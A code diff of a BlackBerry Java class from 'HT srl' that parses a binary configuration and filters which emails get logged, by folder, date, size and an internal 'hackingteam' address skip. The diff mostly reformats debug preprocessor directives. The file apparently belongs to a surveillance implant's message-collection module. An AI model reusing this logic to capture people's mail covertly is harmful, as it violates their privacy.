@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -29,8 +30,9 @@ import blackberry.utils.WChar;
  * The Class Filter.
  */
 public class Filter {
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);
+    //#endif
 
     public static final int TYPE_REALTIME = 0;
     public static final int TYPE_COLLECT = 1;
@@ -92,7 +94,7 @@ public class Filter {
         //#ifdef DBC
         Check.requires(confSize >= headerSize, "conf smaller than needed");
         //#endif
-        
+
         final Prefix headerPrefix = new Prefix(conf, offset);
 
         if (!headerPrefix.isValid()) {
@@ -102,11 +104,11 @@ public class Filter {
         final DataBuffer databuffer = new DataBuffer(conf,
                 headerPrefix.payloadStart, headerPrefix.length, false);
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(headerPrefix.type == Prefix.TYPE_HEADER,
                 "Wrong prefix type");
         Check.asserts(headerSize == headerPrefix.length, "Wrong prefix length");
-        // #endif
+        //#endif
 
         // LETTURA del HEADER
         try {
@@ -127,12 +129,14 @@ public class Filter {
                 classtype = Filter.CLASS_MMS;
             } else {
                 classtype = Filter.CLASS_UNKNOWN;
-                // #debug
+                //#ifdef DEBUG
                 debug.error("classtype unknown: " + classString);
+                //#endif
             }
 
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("classname: " + classString);
+            //#endif
 
             enabled = databuffer.readBoolean();
             all = databuffer.readBoolean();
@@ -160,17 +164,18 @@ public class Filter {
             while (keywordOffset < endOffset) {
                 final Prefix keywordPrefix = new Prefix(conf, keywordOffset);
 
-                // #ifdef DBC
+                //#ifdef DBC
                 Check.asserts(keywordPrefix.type == Prefix.TYPE_KEYWORD,
                         "Wrong prefix type");
-                // #endif
+                //#endif
 
                 final String keyword = WChar.getString(conf, keywordOffset,
                         keywordPrefix.length, false);
                 keywordOffset += keywordPrefix.length + Prefix.LEN;
 
-                //#debug info
+                //#ifdef DEBUG_INFO
                 debug.info("Keyword: " + keyword);
+                //#endif
                 keywords.addElement(keyword);
             }
         }
@@ -196,29 +201,32 @@ public class Filter {
         //#endif
 
         long dataArrivo;
-        // #mdebug
-        /*debug.trace("invio dell'email " + message.getSentDate() + " long: "
-                + message.getSentDate().getTime());
-        debug.trace("arrivo dell'email " + message.getReceivedDate()
-                + " long: " + message.getReceivedDate().getTime());
-        debug.trace("filtro FROM enabled:" + doFilterFromDate + " : "
-                + new Date(fromDate));
-        debug.trace("filtro TO enabled:" + doFilterToDate + " : "
-                + new Date(toDate));*/
+
+        /*
+         * debug.trace("invio dell'email " + message.getSentDate() + " long: "
+         * + message.getSentDate().getTime());
+         * debug.trace("arrivo dell'email " + message.getReceivedDate()
+         * + " long: " + message.getReceivedDate().getTime());
+         * debug.trace("filtro FROM enabled:" + doFilterFromDate + " : "
+         * + new Date(fromDate));
+         * debug.trace("filtro TO enabled:" + doFilterToDate + " : "
+         * + new Date(toDate));
+         */
 
         Address[] from = message.getRecipients(Message.RecipientType.FROM);
         //#ifdef DBC
         Check.asserts(from != null, "filterMessage: from!=null");
         //#endif
+        //#ifdef DEBUG
         for (int i = 0; i < from.length; i++) {
             String addr = from[i].getAddr();
             if (addr != null && addr.indexOf("hackingteam") > -1) {
                 debug.info("INTERNAL Address, skip it");
                 return FILTERED_INTERNAL;
             }
-        }                      
-        // #enddebug
-       
+        }
+        //#endif
+
         Folder folder = message.getFolder();
 
         boolean found = false;
@@ -233,52 +241,59 @@ public class Filter {
                 }
             }
         }
-        
+
         if (!found) {
-            //#debug info
+            //#ifdef DEBUG_INFO
             debug.info("filterMessage: FILTERED_FOUND: " + folder.getName());
+            //#endif
             return FILTERED_FOUND;
         }
         // Se c'e' un filtro sulla data
         // entro
 
         if (!enabled) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             // debug.info("Disabled");
+            //#endif
             // TODO: attenzione, da riabilitare, per qualche ragione e' sempre disabled
             //return FILTERED_DISABLED;
         }
 
         dataArrivo = message.getReceivedDate().getTime();
         if (dataArrivo < lastcheck) {
-            // #debug info
-            debug.info("dataArrivo < lastcheck :" + dataArrivo + " < "+ lastcheck);
+            //#ifdef DEBUG_INFO
+            debug.info("dataArrivo < lastcheck :" + dataArrivo + " < "
+                    + lastcheck);
+            //#endif
             return FILTERED_LASTCHECK;
         }
-   
+
         // se c'e' il filtro from e non viene rispettato escludi la mail
         if (doFilterFromDate == true && dataArrivo < fromDate) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("doFilterFromDate");
+            //#endif
             return FILTERED_FROM;
         }
-              
+
         // Se c'e' anche il filtro della data di fine e non viene rispettato
         // escludi la mail
         if (doFilterToDate == true && dataArrivo > toDate) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("doFilterToDate");
+            //#endif
             return FILTERED_TO;
         }
-       
+
         final int trimAt = 0;
         if ((maxMessageSizeToLog > 0)
                 && (message.getSize() > maxMessageSizeToLog)) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("maxMessageSizeToLog");
+            //#endif
             return FILTERED_SIZE;
         }
-        
+
         return FILTERED_OK;
     }
 
@@ -290,5 +305,4 @@ public class Filter {
     public boolean isValid() {
         return valid;
     }
-
 }
